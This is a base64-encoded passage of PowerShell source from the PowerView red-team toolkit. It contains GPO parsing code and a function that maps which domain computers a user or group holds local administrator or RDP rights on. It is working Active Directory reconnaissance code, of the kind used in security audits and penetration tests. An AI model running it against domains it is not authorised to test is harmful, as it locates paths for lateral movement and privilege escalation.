CAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBNZW1iZXJzICs9ICRNZW1iZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlcnNoaXBWYWx1ZSA9ICRHcm91cE1lbWJlcnMKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIGlmICgtbm90ICRNZW1iZXJzaGlwc1skR3JvdXBdKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXJzaGlwc1skR3JvdXBdID0gQHt9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGlmICgkTWVtYmVyc2hpcFZhbHVlIC1pc25vdCBbU3lzdGVtLkFycmF5XSkgeyRNZW1iZXJzaGlwVmFsdWUgPSBAKCRNZW1iZXJzaGlwVmFsdWUpfQogICAgICAgICAgICAgICAgICAgICRNZW1iZXJzaGlwc1skR3JvdXBdLkFkZCgkUmVsYXRpb24sICRNZW1iZXJzaGlwVmFsdWUpCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgRm9yRWFjaCAoJE1lbWJlcnNoaXAgaW4gJE1lbWJlcnNoaXBzLkdldEVudW1lcmF0b3IoKSkgewogICAgICAgICAgICAgICAgICAgIGlmICgkTWVtYmVyc2hpcCAtYW5kICRNZW1iZXJzaGlwLktleSAtYW5kICgkTWVtYmVyc2hpcC5LZXkgLW1hdGNoICdeXConKSkgewogICAgICAgICAgICAgICAgICAgICAgICAjIGlmIHRoZSBTSUQgaXMgYWxyZWFkeSByZXNvbHZlZCAoaS5lLiBiZWdpbnMgd2l0aCAqKSB0cnkgdG8gcmVzb2x2ZSBTSUQgdG8gYSBuYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cFNJRCA9ICRNZW1iZXJzaGlwLktleS5UcmltKCcqJykKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRHcm91cFNJRCAtYW5kICgkR3JvdXBTSUQuVHJpbSgpIC1uZSAnJykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cE5hbWUgPSBDb252ZXJ0RnJvbS1TSUQgLU9iamVjdFNJRCAkR3JvdXBTSUQgQENvbnZlcnRBcmd1bWVudHMKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cE5hbWUgPSAkRmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgJEdyb3VwTmFtZSA9ICRNZW1iZXJzaGlwLktleQoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRHcm91cE5hbWUgLWFuZCAoJEdyb3VwTmFtZS5UcmltKCkgLW5lICcnKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRHcm91cG5hbWUgLW1hdGNoICdBZG1pbmlzdHJhdG9ycycpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBTSUQgPSAnUy0xLTUtMzItNTQ0JwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZWlmICgkR3JvdXBuYW1lIC1tYXRjaCAnUmVtb3RlIERlc2t0b3AnKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEdyb3VwU0lEID0gJ1MtMS01LTMyLTU1NScKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2VpZiAoJEdyb3VwbmFtZSAtbWF0Y2ggJ0d1ZXN0cycpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBTSUQgPSAnUy0xLTUtMzItNTQ2JwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZWlmICgkR3JvdXBOYW1lLlRyaW0oKSAtbmUgJycpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkQ29udmVydFRvQXJndW1lbnRzID0gQHsnT2JqZWN0TmFtZScgPSAkR3JvdXBuYW1lfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRDb252ZXJ0VG9Bcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEdyb3VwU0lEID0gQ29udmVydFRvLVNJRCBAQ29udmVydFRvQXJndW1lbnRzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBTSUQgPSAkTnVsbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAkR1BPR3JvdXAgPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAgICAgJEdQT0dyb3VwIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dQT0Rpc3BsYXlOYW1lJyAkR1BPRGlzcGxheU5hbWUKICAgICAgICAgICAgICAgICAgICAkR1BPR3JvdXAgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR1BPTmFtZScgJEdQT05hbWUKICAgICAgICAgICAgICAgICAgICAkR1BPR3JvdXAgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR1BPUGF0aCcgJEdQT1BhdGgKICAgICAgICAgICAgICAgICAgICAkR1BPR3JvdXAgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR1BPVHlwZScgJ1Jlc3RyaWN0ZWRHcm91cHMnCiAgICAgICAgICAgICAgICAgICAgJEdQT0dyb3VwIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0ZpbHRlcnMnICROdWxsCiAgICAgICAgICAgICAgICAgICAgJEdQT0dyb3VwIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dyb3VwTmFtZScgJEdyb3VwTmFtZQogICAgICAgICAgICAgICAgICAgICRHUE9Hcm91cCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHcm91cFNJRCcgJEdyb3VwU0lECiAgICAgICAgICAgICAgICAgICAgJEdQT0dyb3VwIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dyb3VwTWVtYmVyT2YnICRNZW1iZXJzaGlwLlZhbHVlLk1lbWJlcm9mCiAgICAgICAgICAgICAgICAgICAgJEdQT0dyb3VwIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dyb3VwTWVtYmVycycgJE1lbWJlcnNoaXAuVmFsdWUuTWVtYmVycwogICAgICAgICAgICAgICAgICAgICRHUE9Hcm91cC5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuR1BPR3JvdXAnKQogICAgICAgICAgICAgICAgICAgICRHUE9Hcm91cAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CgogICAgICAgICAgICAjIG5vdyB0cnkgdG8gdGhlIHBhcnNlIGdyb3VwIHBvbGljeSBwcmVmZXJlbmNlcyBmaWxlIChHcm91cHMueG1sKSBpZiBpdCBleGlzdHMKICAgICAgICAgICAgJFBhcnNlQXJncyA9ICBAewogICAgICAgICAgICAgICAgJ0dyb3Vwc1hNTHBhdGgnID0gIiRHUE9QYXRoXE1BQ0hJTkVcUHJlZmVyZW5jZXNcR3JvdXBzXEdyb3Vwcy54bWwiCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIEdldC1Hcm91cHNYTUwgQFBhcnNlQXJncyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc29sdmVNZW1iZXJzVG9TSURzJ10pIHsKICAgICAgICAgICAgICAgICAgICAkR3JvdXBNZW1iZXJzID0gQCgpCiAgICAgICAgICAgICAgICAgICAgRm9yRWFjaCAoJE1lbWJlciBpbiAkXy5Hcm91cE1lbWJlcnMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRNZW1iZXIgLWFuZCAoJE1lbWJlci5UcmltKCkgLW5lICcnKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRNZW1iZXIgLW5vdG1hdGNoICdeUy0xLS4qJykgewoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIGlmIHRoZSByZXN1bHRpbmcgbWVtYmVyIGlzIHVzZXJuYW1lIGFuZCBub3QgYSBTSUQsIGF0dGVtcHQgdG8gcmVzb2x2ZSBpdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRDb252ZXJ0VG9Bcmd1bWVudHMgPSBAeydPYmplY3ROYW1lJyA9ICRHcm91cG5hbWV9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJENvbnZlcnRUb0FyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyU0lEID0gQ29udmVydFRvLVNJRCAtRG9tYWluICREb21haW4gLU9iamVjdE5hbWUgJE1lbWJlcgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJE1lbWJlclNJRCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBNZW1iZXJzICs9ICRNZW1iZXJTSUQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cE1lbWJlcnMgKz0gJE1lbWJlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cE1lbWJlcnMgKz0gJE1lbWJlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRfLkdyb3VwTWVtYmVycyA9ICRHcm91cE1lbWJlcnMKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAkXyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHUE9EaXNwbGF5TmFtZScgJEdQT0Rpc3BsYXlOYW1lCiAgICAgICAgICAgICAgICAkXyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHUE9OYW1lJyAkR1BPTmFtZQogICAgICAgICAgICAgICAgJF8gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR1BPVHlwZScgJ0dyb3VwUG9saWN5UHJlZmVyZW5jZXMnCiAgICAgICAgICAgICAgICAkXy5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuR1BPR3JvdXAnKQogICAgICAgICAgICAgICAgJF8KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEdldC1Eb21haW5HUE9Vc2VyTG9jYWxHcm91cE1hcHBpbmcgewo8IwouU1lOT1BTSVMKCkVudW1lcmF0ZXMgdGhlIG1hY2hpbmVzIHdoZXJlIGEgc3BlY2lmaWMgZG9tYWluIHVzZXIvZ3JvdXAgaXMgYSBtZW1iZXIgb2YgYSBzcGVjaWZpYwpsb2NhbCBncm91cCwgYWxsIHRocm91Z2ggR1BPIGNvcnJlbGF0aW9uLiBJZiBubyB1c2VyL2dyb3VwIGlzIHNwZWNpZmllZCwgYWxsCmRpc2NvdmVyYWJsZSBtYXBwaW5ncyBhcmUgcmV0dXJuZWQuCgpBdXRob3I6IEBoYXJtajB5ICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBHZXQtRG9tYWluR1BPTG9jYWxHcm91cCwgR2V0LURvbWFpbk9iamVjdCwgR2V0LURvbWFpbkNvbXB1dGVyLCBHZXQtRG9tYWluT1UsIEdldC1Eb21haW5TaXRlLCBHZXQtRG9tYWluR3JvdXAgIAoKLkRFU0NSSVBUSU9OCgpUYWtlcyBhIHVzZXIvZ3JvdXAgbmFtZSBhbmQgb3B0aW9uYWwgZG9tYWluLCBhbmQgZGV0ZXJtaW5lcyB0aGUgY29tcHV0ZXJzIGluIHRoZSBkb21haW4KdGhlIHVzZXIvZ3JvdXAgaGFzIGxvY2FsIGFkbWluIChvciBSRFApIHJpZ2h0cyB0by4KCkl0IGRvZXMgdGhpcyBieToKICAgIDEuICByZXNvbHZpbmcgdGhlIHVzZXIvZ3JvdXAgdG8gaXRzIHByb3BlciBTSUQKICAgIDIuICBlbnVtZXJhdGluZyBhbGwgZ3JvdXBzIHRoZSB1c2VyL2dyb3VwIGlzIGEgY3VycmVudCBwYXJ0IG9mCiAgICAgICAgYW5kIGV4dHJhY3RpbmcgYWxsIHRhcmdldCBTSURzIHRvIGJ1aWxkIGEgdGFyZ2V0IFNJRCBsaXN0CiAgICAzLiAgcHVsbGluZyBhbGwgR1BPcyB0aGF0IHNldCAnUmVzdHJpY3RlZCBHcm91cHMnIG9yIEdyb3Vwcy54bWwgYnkgY2FsbGluZwogICAgICAgIEdldC1Eb21haW5HUE9Mb2NhbEdyb3VwCiAgICA0LiAgbWF0Y2hpbmcgdGhlIHRhcmdldCBTSUQgbGlzdCB0byB0aGUgcXVlcmllZCBHUE8gU0lEIGxpc3QKICAgICAgICB0byBlbnVtZXJhdGUgYWxsIEdQTyB0aGUgdXNlciBpcyBlZmZlY3RpdmVseSBhcHBsaWVkIHdpdGgKICAgIDUuICBlbnVtZXJhdGluZyBhbGwgT1VzIGFuZCBzaXRlcyBhbmQgYXBwbGljYWJsZSBHUE8gR1VJcyBhcmUKICAgICAgICBhcHBsaWVkIHRvIHRocm91Z2ggZ3BsaW5rIGVudW1lcmF0aW5nCiAgICA2LiAgcXVlcnlpbmcgZm9yIGFsbCBjb21wdXRlcnMgdW5kZXIgdGhlIGdpdmVuIE9VcyBvciBzaXRlcwoKSWYgbm8gdXNlci9ncm91cCBpcyBzcGVjaWZpZWQsIGFsbCB1c2VyL2dyb3VwIC0+IG1hY2hpbmUgbWFwcGluZ3MgZGlzY292ZXJlZCB0aHJvdWdoCkdQTyByZWxhdGlvbnNoaXBzIGFyZSByZXR1cm5lZC4KCi5QQVJBTUVURVIgSWRlbnRpdHkKCkEgU2FtQWNjb3VudE5hbWUgKGUuZy4gaGFybWoweSksIERpc3Rpbmd1aXNoZWROYW1lIChlLmcuIENOPWhhcm1qMHksQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbCksClNJRCAoZS5nLiBTLTEtNS0yMS04OTAxNzE4NTktMzQzMzgwOTI3OS0zMzY2MTk2NzUzLTExMDgpLCBvciBHVUlEIChlLmcuIDRjNDM1ZGQ3LWRjNTgtNGIxNC05YTVlLTFmZGIwZTgwZDIwMSkKZm9yIHRoZSB1c2VyL2dyb3VwIHRvIGlkZW50aXR5IEdQTyBsb2NhbCBncm91cCBtYXBwaW5ncyBmb3IuCgouUEFSQU1FVEVSIExvY2FsR3JvdXAKClRoZSBsb2NhbCBncm91cCB0byBjaGVjayBhY2Nlc3MgYWdhaW5zdC4KQ2FuIGJlICJBZG1pbmlzdHJhdG9ycyIgKFMtMS01LTMyLTU0NCksICJSRFAvUmVtb3RlIERlc2t0b3AgVXNlcnMiIChTLTEtNS0zMi01NTUpLApvciBhIGN1c3RvbSBsb2NhbCBTSUQuIERlZmF1bHRzIHRvIGxvY2FsICdBZG1pbmlzdHJhdG9ycycuCgouUEFSQU1FVEVSIERvbWFpbgoKU3BlY2lmaWVzIHRoZSBkb21haW4gdG8gZW51bWVyYXRlIEdQT3MgZm9yLCBkZWZhdWx0cyB0byB0aGUgY3VycmVudCBkb21haW4uCgouUEFSQU1FVEVSIFNlcnZlcgoKU3BlY2lmaWVzIGFuIEFjdGl2ZSBEaXJlY3Rvcnkgc2VydmVyIChkb21haW4gY29udHJvbGxlcikgdG8gYmluZCB0by4KCi5QQVJBTUVURVIgU2VhcmNoU2NvcGUKClNwZWNpZmllcyB0aGUgc2NvcGUgdG8gc2VhcmNoIHVuZGVyLCBCYXNlL09uZUxldmVsL1N1YnRyZWUgKGRlZmF1bHQgb2YgU3VidHJlZSkuCgouUEFSQU1FVEVSIFJlc3VsdFBhZ2VTaXplCgpTcGVjaWZpZXMgdGhlIFBhZ2VTaXplIHRvIHNldCBmb3IgdGhlIExEQVAgc2VhcmNoZXIgb2JqZWN0LgoKLlBBUkFNRVRFUiBTZXJ2ZXJUaW1lTGltaXQKClNwZWNpZmllcyB0aGUgbWF4aW11bSBhbW91bnQgb2YgdGltZSB0aGUgc2VydmVyIHNwZW5kcyBzZWFyY2hpbmcuIERlZmF1bHQgb2YgMTIwIHNlY29uZHMuCgouUEFSQU1FVEVSIFRvbWJzdG9uZQoKU3dpdGNoLiBTcGVjaWZpZXMgdGhhdCB0aGUgc2VhcmNoZXIgc2hvdWxkIGFsc28gcmV0dXJuIGRlbGV0ZWQvdG9tYnN0b25lZCBvYmplY3RzLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSB0YXJnZXQgZG9tYWluLgoKLkVYQU1QTEUKCkdldC1Eb21haW5HUE9Vc2VyTG9jYWxHcm91cE1hcHBpbmcKCkZpbmQgYWxsIHVzZXIvZ3JvdXAgLT4gbWFjaGluZSByZWxhdGlvbnNoaXBzIHdoZXJlIHRoZSB1c2VyL2dyb3VwIGlzIGEgbWVtYmVyCm9mIHRoZSBsb2NhbCBhZG1pbmlzdHJhdG9ycyBncm91cCBvbiB0YXJnZXQgbWFjaGluZXMuCgouRVhBTVBMRQoKR2V0LURvbWFpbkdQT1VzZXJMb2NhbEdyb3VwTWFwcGluZyAtSWRlbnRpdHkgZGZtIC1Eb21haW4gZGV2LnRlc3RsYWIubG9jYWwKCkZpbmQgYWxsIGNvbXB1dGVycyB0aGF0IGRmbSB1c2VyIGhhcyBsb2NhbCBhZG1pbmlzdHJhdG9yIHJpZ2h0cyB0byBpbgp0aGUgZGV2LnRlc3RsYWIubG9jYWwgZG9tYWluLgoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpCkdldC1Eb21haW5HUE9Vc2VyTG9jYWxHcm91cE1hcHBpbmcgLUNyZWRlbnRpYWwgJENyZWQKCi5PVVRQVVRTCgpQb3dlclZpZXcuR1BPTG9jYWxHcm91cE1hcHBpbmcKCkEgY3VzdG9tIFBTT2JqZWN0IGNvbnRhaW5pbmcgYW55IHRhcmdldCBpZGVudGl0eSBpbmZvcm1hdGlvbiBhbmQgd2hhdCBsb2NhbApncm91cCBtZW1iZXJzaGlwcyB0aGV5J3JlIGEgcGFydCBvZiB0aHJvdWdoIEdQTyBjb3JyZWxhdGlvbi4KCi5MSU5LCgpodHRwOi8vd3d3Lmhhcm1qMHkubmV0L2Jsb2cvcmVkdGVhbWluZy93aGVyZS1teS1hZG1pbnMtYXQtZ3BvLWVkaXRpb24vCiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuR1BPVXNlckxvY2FsR3JvdXBNYXBwaW5nJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdEaXN0aW5ndWlzaGVkTmFtZScsICdTYW1BY2NvdW50TmFtZScsICdOYW1lJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkSWRlbnRpdHksCgogICAgICAgIFtTdHJpbmddCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdBZG1pbmlzdHJhdG9ycycsICdTLTEtNS0zMi01NDQnLCAnUkRQJywgJ1JlbW90ZSBEZXNrdG9wIFVzZXJzJywgJ1MtMS01LTMyLTU1NScpXQogICAgICAgICRMb2NhbEdyb3VwID0gJ0FkbWluaXN0cmF0b3JzJywKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdBRFNQYXRoJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoQmFzZSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCgogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgJENvbW1vbkFyZ3VtZW50cyA9IEB7fQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRDb21tb25Bcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJENvbW1vbkFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICRDb21tb25Bcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJENvbW1vbkFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJENvbW1vbkFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkQ29tbW9uQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkQ29tbW9uQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICB9CgogICAgUFJPQ0VTUyB7CiAgICAgICAgJFRhcmdldFNJRHMgPSBAKCkKCiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snSWRlbnRpdHknXSkgewogICAgICAgICAgICAkVGFyZ2V0U0lEcyArPSBHZXQtRG9tYWluT2JqZWN0IEBDb21tb25Bcmd1bWVudHMgLUlkZW50aXR5ICRJZGVudGl0eSB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZCBvYmplY3RzaWQKICAgICAgICAgICAgJFRhcmdldE9iamVjdFNJRCA9ICRUYXJnZXRTSURzCiAgICAgICAgICAgIGlmICgtbm90ICRUYXJnZXRTSURzKSB7CiAgICAgICAgICAgICAgICBUaHJvdyAiW0dldC1Eb21haW5HUE9Vc2VyTG9jYWxHcm91cE1hcHBpbmddIFVuYWJsZSB0byByZXRyaWV2ZSBTSUQgZm9yIGlkZW50aXR5ICckSWRlbnRpdHknIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAjIG5vIGZpbHRlcmluZy9tYXRjaCBhbGwKICAgICAgICAgICAgJFRhcmdldFNJRHMgPSBAKCcqJykKICAgICAgICB9CgogICAgICAgIGlmICgkTG9jYWxHcm91cCAtbWF0Y2ggJ1MtMS01JykgewogICAgICAgICAgICAkVGFyZ2V0TG9jYWxTSUQgPSAkTG9jYWxHcm91cAogICAgICAgIH0KICAgICAgICBlbHNlaWYgKCRMb2NhbEdyb3VwIC1tYXRjaCAnQWRtaW4nKSB7CiAgICAgICAgICAgICRUYXJnZXRMb2NhbFNJRCA9ICdTLTEtNS0zMi01NDQnCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAjIFJEUAogICAgICAgICAgICAkVGFyZ2V0TG9jYWxTSUQgPSAnUy0xLTUtMzItNTU1JwogICAgICAgIH0KCiAgICAgICAgaWYgKCRUYXJnZXRTSURzWzBdIC1uZSAnKicpIHsKICAgICAgICAgICAgRm9yRWFjaCAoJFRhcmdldFNpZCBpbiAkVGFyZ2V0U2lkcykgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5HUE9Vc2VyTG9jYWxHcm91cE1hcHBpbmddIEVudW1lcmF0aW5nIG5lc3RlZCBncm91cCBtZW1iZXJzaGlwcyBmb3I6ICckVGFyZ2V0U2lkJyIKICAgICAgICAgICAgICAgICRUYXJnZXRTSURzICs9IEdldC1Eb21haW5Hcm91cCBAQ29tbW9uQXJndW1lbnRzIC1Qcm9wZXJ0aWVzICdvYmplY3RzaWQnIC1NZW1iZXJJZGVudGl0eSAkVGFyZ2V0U2lkIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgb2JqZWN0c2lkCiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluR1BPVXNlckxvY2FsR3JvdXBNYXBwaW5nXSBUYXJnZXQgbG9jYWxncm91cCBTSUQ6ICRUYXJnZXRMb2NhbFNJRCIKICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkdQT1VzZXJMb2NhbEdyb3VwTWFwcGluZ10gRWZmZWN0aXZlIHRhcmdldCBkb21haW4gU0lEczogJFRhcmdldFNJRHMiCgogICAgICAgICRHUE9ncm91cHMgPSBHZXQtRG9tYWluR1BPTG9jYWxHcm91cCBAQ29tbW9uQXJndW1lbnRzIC1SZXNvbHZlTWVtYmVyc1RvU0lEcyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgJEdQT2dyb3VwID0gJF8KICAgICAgICAgICAgIyBpZiB0aGUgbG9jYWxseSBzZXQgZ3JvdXAgaXMgd2hhdCB3ZSdyZSBsb29raW5nIGZvciwgY2hlY2sgdGhlIEdyb3VwTWVtYmVycyAoJ21lbWJlcnMnKSBmb3Igb3VyIHRhcmdldCBTSUQKICAgICAgICAgICAgaWYgKCRHUE9ncm91cC5Hcm91cFNJRCAtbWF0Y2ggJFRhcmdldExvY2FsU0lEKSB7CiAgICAgICAgICAgICAgICAkR1BPZ3JvdXAuR3JvdXBNZW1iZXJ